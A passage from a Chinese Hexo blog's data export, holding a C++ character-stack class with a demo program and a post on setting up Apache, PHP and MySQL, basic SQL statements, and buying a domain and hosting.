class=\"line\">\tMyStack(<span class=\"keyword\">int</span> size);                       <span class=\"comment\">//分配内存初始化栈空间，设定栈容量，栈顶</span></span><br><span class=\"line\">\t~MyStack();                              <span class=\"comment\">//回收栈空间内存</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">stackEmpty</span><span class=\"params\">()</span></span>;                       <span class=\"comment\">//判断栈是否为空，为空返回true,非空返回false</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">stackFull</span><span class=\"params\">()</span></span>;                        <span class=\"comment\">//判断栈是否为满，为满返回true，非满返回false</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">clearStack</span><span class=\"params\">()</span></span>;                       <span class=\"comment\">//清空栈</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">stackLength</span><span class=\"params\">()</span></span>;                       <span class=\"comment\">//已有元素个数</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">push</span><span class=\"params\">(<span class=\"keyword\">char</span> elem)</span></span>;                    <span class=\"comment\">//元素入栈，栈顶上升</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">pop</span><span class=\"params\">(<span class=\"keyword\">char</span> &amp;elem)</span></span>;                    <span class=\"comment\">//元素出栈，栈顶下降</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">stackTraverse</span><span class=\"params\">(<span class=\"keyword\">bool</span> isFromButtorm)</span></span>;  <span class=\"comment\">//遍历栈中所有元素</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span>:</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> *m_pBuffer;              <span class=\"comment\">//栈空间指针</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> m_iSize;                  <span class=\"comment\">//栈容量</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> m_iTop;                   <span class=\"comment\">//栈顶，栈中元素个数</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"># endif</span><br></pre></td></tr></table></figure></p>\n<p><strong>MyStack.cpp</strong><br><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># include <span class=\"string\">\"MyStack.h\"</span></span><br><span class=\"line\"># include &lt;iostream&gt;</span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">MyStack::MyStack(<span class=\"keyword\">int</span> size)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tm_iSize = size;</span><br><span class=\"line\">\tm_pBuffer = <span class=\"keyword\">new</span> <span class=\"keyword\">char</span>[size];</span><br><span class=\"line\">\tm_iTop = <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">MyStack::~MyStack()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">delete</span> []m_pBuffer;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">bool</span> MyStack::stackEmpty()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"number\">0</span> == m_iTop)       <span class=\"comment\">//此处为了优秀代码，也可写成 m_iTop == 0;</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">bool</span> MyStack::stackFull()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (m_iTop == m_iSize)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">void</span> MyStack::clearStack()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tm_iTop = <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> MyStack::stackLength()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> m_iTop;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">bool</span> MyStack::push(<span class=\"keyword\">char</span> elem)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (stackFull())</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tm_pBuffer[m_iTop] = elem;</span><br><span class=\"line\">\tm_iTop++;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">bool</span> MyStack::pop(<span class=\"keyword\">char</span> &amp;elem)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (stackEmpty())</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tm_iTop--;</span><br><span class=\"line\">\telem = m_pBuffer[m_iTop];</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">void</span> MyStack::stackTraverse(<span class=\"keyword\">bool</span> isFromButtorm)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (isFromButtorm)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; m_iTop; i++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">cout</span> &lt;&lt; m_pBuffer[i] &lt;&lt; <span class=\"string\">\",\"</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = m_iTop<span class=\"number\">-1</span>; i &gt;= <span class=\"number\">0</span>; i--)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">cout</span> &lt;&lt; m_pBuffer[i] &lt;&lt; <span class=\"string\">\",\"</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>demo.cpp</strong><br><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># include &lt;stdlib.h&gt;</span><br><span class=\"line\"># include <span class=\"string\">\"MyStack.h\"</span></span><br><span class=\"line\"># include &lt;iostream&gt;</span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">\tMyStack *pStack = <span class=\"keyword\">new</span> MyStack(<span class=\"number\">5</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tpStack-&gt;push(<span class=\"string\">'h'</span>);</span><br><span class=\"line\">\tpStack-&gt;push(<span class=\"string\">'e'</span>);</span><br><span class=\"line\">\tpStack-&gt;push(<span class=\"string\">'l'</span>);</span><br><span class=\"line\">\tpStack-&gt;push(<span class=\"string\">'l'</span>);</span><br><span class=\"line\">\tpStack-&gt;push(<span class=\"string\">'o'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tpStack-&gt;stackTraverse(<span class=\"literal\">true</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">char</span> elem = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tpStack-&gt;pop(elem);</span><br><span class=\"line\"></span><br><span class=\"line\">\tpStack-&gt;stackTraverse(<span class=\"literal\">true</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//pStack-&gt;clearStack();</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; pStack-&gt;stackLength() &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (pStack-&gt;stackEmpty())</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"栈为空\"</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (pStack-&gt;stackFull())</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"栈为满\"</span> &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">delete</span> pStack;</span><br><span class=\"line\">\tpStack = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tsystem(<span class=\"string\">\"pause\"</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>"},{"title":"服务器折腾中。。。","date":"2016-06-12T16:00:00.000Z","_content":"\n### 安装\n**需要安装apahce2,php5,mysql,命令：**\n\n``` bash\n$sudo apt-get install apache2\n$sudo apt-get install php5\n$sudo apt-get install mysql\n```\n\n#### 使用记录\n**apache2重启命令等**\n<!--more-->\n``` bash\n$/etc/init.d/apache2 restart\n$/etc/init.d/apache2 start\n$/etc/init.d/apache2 stop\n```\n\n**mysql命令记录**\n说之前我得记录一下，像我这种菜鸟，还是得用图形界面习惯一点，纯命令太难了，所以记录一下mysql的可视化软件sqlyog\n\n### MySQL管理\n**启动MySQL**\n```\nsudo service mysql start\n```\n**1.创建新数据库**\n```\ncreate database xscj;\n```\n**2.查看数据库**\n```\nshow databases;\n```\n**3.选择数据库**\n```\nuse xscj;\n```\n**4.创建表**\n```\ncreate table student(\nnumber varchar(6) NOT NULL,\nname varchar(10) NOT NULL,\nsex tinyint NOT NULL,\nbirthday date);\n```\n**5.查看表结构**\n```\ndescribe student;\n```\n**6.修改表**\n```\nalter table student add(xuefen int default 0, beizhu text NULL);\n```\n**7.插入记录**\n```\ninsert into student values('1513011','gaojie',1,cast('19961111'as date),0,'');\n```\n:注释一下，cast(exp as type)为类型转换函数\n\n**检验是否插入成功**\n```\nselect * from student;\n```\n\n### 服务器配置更新内容\n**更新时间：2016年11月20日**\n**鉴于之前单个下载LAMP，然后又要各种配置和模块加载，很复杂而且我一直没配置成功，最后走了一条偏激的道路。直接一条命令将所有的下载完成，并且自动将所有都配置好。**\n[详细内容](https://github.com/teddysun/lamp)\n\n### 域名和虚拟主机\n**更新时间：2016年11月24日**\n**一直想要一个自己的域名和自己的虚拟主机，在昨天突发奇想去了godadday逛了一下看有没有合适的域名，很庆幸我捡到了一个一年8块钱的域名，不知道为什么那么便宜，总之就是8块钱买了一个属于自己的域名：**\n\n1. .在godadday上注册一个账号，然后筛选一个你觉得合适的域名下订单。\n2. 进入自己的控制台了解一下基本情况.\n3. 域名可以绑定自己配置的服务器，也可以在网上购买一个虚拟主机，通过配置域名的DNS、host names和Nameservers将域名绑定到指定的主机\n4. 下载一个ftp软件，通过ftp软件来管理自己的虚拟主机，推荐软件FileZilla\n\n**推荐虚拟主机购买网址hostinger(英国)，可获得免费的虚拟主机一年**\n[godadday](https://www.godaddy.com)购买域名，个人感觉比[万网](http://wanwang.aliyun.com)要划算\n[hostinger](http://www.hostinger.com.hk)购买虚拟主机，有免费的空间哦","source":"_posts/服务器.md","raw":"---\ntitle: 服务器折腾中。。。\ndate: 2016-06-13\ncategories: linux\ntags:\n  - lnmp\n  - mysql\n---\n\n### 安装\n**需要安装apahce2,php5,mysql,命令：**\n\n``` bash\n$sudo apt-get install apache2\n$sudo apt-get install php5\n$sudo apt-get install mysql\n```\n\n#### 使用记录\n**apache2重启命令等**\n<!--more-->\n``` bash\n$/etc/init.d/apache2 restart\n$/etc/init.d/apache2 start\n$/etc/init.d/apache2 stop\n```\n\n**mysql命令记录**\n说之前我得记录一下，像我这种菜鸟，还是得用图形界面习惯一点，纯命令太难了，所以记录一下mysql的可视化软件sqlyog\n\n### MySQL管理\n**启动MySQL**\n```\nsudo service mysql start\n```\n**1.创建新数据库**\n```\ncreate database xscj;\n```\n**2.查看数据库**\n```\nshow databases;\n```\n**3.选择数据库**\n```\nuse xscj;\n```\n**4.创建表**\n```\ncreate table student(\nnumber varchar(6) NOT NULL,\nname varchar(10) NOT NULL,\nsex tinyint NOT NULL,\nbirthday date);\n```\n**5.查看表结构**\n```\ndescribe student;\n```\n**6.修改表**\n```\nalter table student add(xuefen int default 0, beizhu text NULL);\n```\n**7.插入记录**\n```\ninsert into student values('1513011','gaojie',1,cast('19961111'as date),0,'');\n```\n:注释一下，cast(exp as type)为类型转换函数\n\n**检验是否插入成功**\n```\nselect * from student;\n```\n\n### 服务器配置更新内容\n**更新时间：2016年11月20日**\n**鉴于之前单个下载LAMP，然后又要各种配置和模块加载，很复杂而且我一直没配置成功，最后走了一条偏激的道路。直接一条命令将所有的下载完成，并且自动将所有都配置好。**\n[详细内容](https://github.com/teddysun/lamp)\n\n### 域名和虚拟主机\n**更新时间：2016年11月24日**\n**一直想要一个自己的域名和自己的虚拟主机，在昨天突发奇想去了godadday逛了一下看有没有合适的域名，很庆幸我捡到了一个一年8块钱的域名，不知道为什么那么便宜，总之就是8块钱买了一个属于自己的域名：**\n\n1. .在godadday上注册一个账号，然后筛选一个你觉得合适的域名下订单。\n2. 进入自己的控制台了解一下基本情况.\n3. 域名可以绑定自己配置的服务器，也可以在网上购买一个虚拟主机，通过配置域名的DNS、host names和Nameservers将域名绑定到指定的主机\n4. 下载一个ftp软件，通过ftp软件来管理自己的虚拟主机，推荐软件FileZilla\n\n**推荐虚拟主机购买网址hostinger(英国)，可获得免费的虚拟主机一年**\n[godadday](https://www.godaddy.com)购买域名，个人感觉比[万网](http://wanwang.aliyun.com)要划算\n[hostinger](http://www.hostinger.com.hk)购买虚拟主机，有免费的空间哦","slug":"服务器","published":1,"updated":"2017-11-28T03:30:56.289Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjsd0k003uyp0ln48n8kg6","content":"<h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3><p><strong>需要安装apahce2,php5,mysql,命令：</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sudo</span> apt-get install apache2</span><br><span class=\"line\"><span class=\"variable\">$sudo</span> apt-get install php5</span><br><span class=\"line\"><span class=\"variable\">$sudo</span> apt-get install mysql</span><br></pre></td></tr></table></figure>\n<h4 id=\"使用记录\"><a href=\"#使用记录\" class=\"headerlink\" title=\"使用记录\"></a>使用记录</h4><p><strong>apache2重启命令等</strong><br><a id=\"more\"></a><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$/etc/init.d/apache2 restart</span><br><span class=\"line\">$/etc/init.d/apache2 start</span><br><span class=\"line\">$/etc/init.d/apache2 stop</span><br></pre></td></tr></table></figure></p>\n<p><strong>mysql命令记录</strong><br>说之前我得记录一下，像我这种菜鸟，还是得用图形界面习惯一点，纯命令太难了，所以记录一下mysql的可视化软件sqlyog</p>\n<h3 id=\"MySQL管理\"><a href=\"#MySQL管理\" class=\"headerlink\" title=\"MySQL管理\"></a>MySQL管理</h3><p><strong>启动MySQL</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo service mysql start</span><br></pre></td></tr></table></figure></p>\n<p><strong>1.创建新数据库</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create database xscj;</span><br></pre></td></tr></table></figure></p>\n<p><strong>2.查看数据库</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">show databases;</span><br></pre></td></tr></table></figure></p>\n<p><strong>3.选择数据库</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use xscj;</span><br></pre></td></tr></table></figure></p>\n<p><strong>4.创建表</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create table student(</span><br><span class=\"line\">number varchar(6) NOT NULL,</span><br><span class=\"line\">name varchar(10) NOT NULL,</span><br><span class=\"line\">sex tinyint NOT NULL,</span><br><span class=\"line\">birthday date);</span><br></pre></td></tr></table></figure></p>\n<p><strong>5.查看表结构</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">describe student;</span><br></pre></td></tr></table></figure></p>\n<p><strong>6.修改表</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">alter table student add(xuefen int default 0, beizhu text NULL);</span><br></pre></td></tr></table></figure></p>\n<p><strong>7.插入记录</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">insert into student values(&apos;1513011&apos;,&apos;gaojie&apos;,1,cast(&apos;19961111&apos;as date),0,&apos;&apos;);</span><br></pre></td></tr></table></figure></p>\n<p>:注释一下，cast(exp as type)为类型转换函数</p>\n<p><strong>检验是否插入成功</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from student;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"服务器配置更新内容\"><a href=\"#服务器配置更新内容\" class=\"headerlink\" title=\"服务器配置更新内容\"></a>服务器配置更新内容</h3><p><strong>更新时间：2016年11月20日</strong><br><strong>鉴于之前单个下载LAMP，然后又要各种配置和模块加载，很复杂而且我一直没配置成功，最后走了一条偏激的道路。直接一条命令将所有的下载完成，并且自动将所有都配置好。</strong><br><a href=\"https://github.com/teddysun/lamp\" target=\"_blank\" rel=\"external\">详细内容</a></p>\n<h3 id=\"域名和虚拟主机\"><a href=\"#域名和虚拟主机\" class=\"headerlink\" title=\"域名和虚拟主机\"></a>域名和虚拟主机</h3><p><strong>更新时间：2016年11月24日</strong><br><strong>一直想要一个自己的域名和自己的虚拟主机，在昨天突发奇想去了godadday逛了一下看有没有合适的域名，很庆幸我捡到了一个一年8块钱的域名，不知道为什么那么便宜，总之就是8块钱买了一个属于自己的域名：</strong></p>\n<ol>\n<li>.在godadday上注册一个账号，然后筛选一个你觉得合适的域名下订单。</li>\n<li>进入自己的控制台了解一下基本情况.</li>\n<li>域名可以绑定自己配置的服务器，也可以在网上购买一个虚拟主机，通过配置域名的DNS、host names和Nameservers将域名绑定到指定的主机</li>\n<li>下载一个ftp软件，通过ftp软件来管理自己的虚拟主机，推荐软件FileZilla</li>\n</ol>\n<p><strong>推荐虚拟主机购买网址hostinger(英国)，可获得免费的虚拟主机一年</strong><br><a href=\"https://www.godaddy.com\" target=\"_blank\" rel=\"external\">godadday</a>购买域名，个人感觉比<a href=\"http://wanwang.aliyun.com\" target=\"_blank\" rel=\"external\">万网</a>要划算<br><a href=\"http://www.hostinger.com.hk\" target=\"_blank\" rel=\"external\">hostinger</a>购买虚拟主机，有免费的空间哦</p>\n","excerpt":"<h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3><p><strong>需要安装apahce2,php5,mysql,命令：</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sudo</span> apt-get install apache2</span><br><span class=\"line\"><span class=\"variable\">$sudo</span> apt-get install php5</span><br><span class=\"line\"><span class=\"variable\">$sudo</span> apt-get install mysql</span><br></pre></td></tr></table></figure>\n<h4 id=\"使用记录\"><a href=\"#使用记录\" class=\"headerlink\" title=\"使用记录\"></a>使用记录</h4><p><strong>apache2重启命令等</strong><br>","more":"<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$/etc/init.d/apache2 restart</span><br><span class=\"line\">$/etc/init.d/apache2 start</span><br><span class=\"line\">$/etc/init.d/apache2 stop</span><br></pre></td></tr></table></figure></p>\n<p><strong>mysql命令记录</strong><br>说之前我得记录一下，像我这种菜鸟，还是得用图形界面习惯一点，纯命令太难了，所以记录一下mysql的可视化软件sqlyog</p>\n<h3 id=\"MySQL管理\"><a href=\"#MySQL管理\" class=\"headerlink\" title=\"MySQL管理\"></a>MySQL管理</h3><p><strong>启动MySQL</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo service mysql start</span><br></pre></td></tr></table></figure></p>\n<p><strong>1.创建新数据库</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create database xscj;</span><br></pre></td></tr></table></figure></p>\n<p><strong>2.查看数据库</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">show databases;</span><br></pre></td></tr></table></figure></p>\n<p><strong>3.选择数据库</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use xscj;</span><br></pre></td></tr></table></figure></p>\n<p><strong>4.创建表</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">create table student(</span><br><span class=\"line\">number varchar(6) NOT NULL,</span><br><span class=\"line\">name varchar(10) NOT NULL,</span><br><span class=\"line\">sex tinyint NOT NULL,</span><br><span class=\"line\">birthday date);</span><br></pre></td></tr></table></figure></p>\n<p><strong>5.查看表结构</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">describe student;</span><br></pre></td></tr></table></figure></p>\n<p><strong>6.修改表</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">alter table student add(xuefen int default 0, beizhu text NULL);</span><br></pre></td></tr></table></figure></p>\n<p><strong>7.插入记录</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">insert into student values(&apos;1513011&apos;,&apos;gaojie&apos;,1,cast(&apos;19961111&apos;as date),0,&apos;&apos;);</span><br></pre></td></tr></table></figure></p>\n<p>:注释一下，cast(exp as type)为类型转换函数</p>\n<p><strong>检验是否插入成功</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from student;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"服务器配置更新内容\"><a href=\"#服务器配置更新内容\" class=\"headerlink\" title=\"服务器配置更新内容\"></a>服务器配置更新内容</h3><p><strong>更新时间：2016年11月20日</strong><br><strong>鉴于之前单个下载LAMP，然后又要各种配置和模块加载，很复杂而且我一直没配置成功，最后走了一条偏激的道路。直接一条命令将所有的下载完成，并且自动将所有都配置好。</strong><br><a href=\"https://github.com/teddysun/lamp\">详细内容</a></p>\n<h3 id=\"域名和虚拟主机\"><a href=\"#域名和虚拟主机\" class=\"headerlink\" 